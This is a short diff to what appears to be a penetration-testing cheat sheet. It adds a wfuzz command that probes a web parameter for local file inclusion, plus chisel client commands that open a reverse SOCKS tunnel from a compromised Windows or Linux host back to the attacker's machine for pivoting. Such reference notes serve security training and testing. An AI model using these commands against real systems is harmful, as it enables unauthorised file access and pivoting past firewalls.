@@ -333,6 +333,10 @@ directory-list-2.3-medium.txt
 directory-list-lowercase-2.3-medium.txt
 ```
 
+#LFI FUZZ
+wfuzz -c -z file,LFI_FUZZ.txt "http://{RHOST}/browse.php?p=source&file=FUZZ"
+
+
 <br />
 
 
@@ -1491,7 +1495,11 @@ chisel server -p 3477 --socks5 --reverse
 
 # RHOST (Windows) - Transfer chisel.exe
 chisel64.exe client {LHOST}:3477 R:socks
+
 PS> .\chisel64.exe client {LHOST}:3477 R:socks
+
+# RHOST (Linux) - Transfer chisel_lin64
+./chisel_lin64 client {LHOST}:3477 R:socks
 
 # LHOST
 sudo NMAP -sT -Pn -n {FIREWALLED RHOST}
